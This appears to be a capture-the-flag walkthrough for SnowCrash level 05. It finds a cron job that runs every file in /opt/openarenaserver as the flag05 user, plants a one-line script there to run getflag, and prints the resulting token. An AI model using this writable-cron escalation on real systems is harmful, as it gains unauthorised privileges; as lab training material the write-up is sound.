# Level 05
We get a message when logging in:

    level05@localhost's password: 
    You have new mail.

Let's start by enumerating:

    level05@SnowCrash:~$ ls
    level05@SnowCrash:~$ find / -user flag05 2>/dev/null
    /usr/sbin/openarenaserver
    /rofs/usr/sbin/openarenaserver
We find two files, let's see what's inside:

    level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
    #!/bin/sh
    for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
    done
So, this script executes any file in the /opt/openarenaserver and then removes it, 
Now let's check our mail:

    level05@SnowCrash:~$ find / mail 2>/dev/null | grep mail
    ...
    /rofs/var/mail
    /rofs/var/mail/level05
    /rofs/var/spool/mail
    ...
    level05@SnowCrash:~$ cat /rofs/var/mail/level05
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
This looks like a cron execution of the openarenaserver script by flag05 every 2min
So now let's try a little script:

    echo "getflag > /tmp/flag.txt" > /opt/openarenaserver/test.sh
We wait ~2 min:

    level05@SnowCrash:~$ cat /tmp/flag.txt
    Check flag.Here is your token : viuaaale9huek52boumoomioc
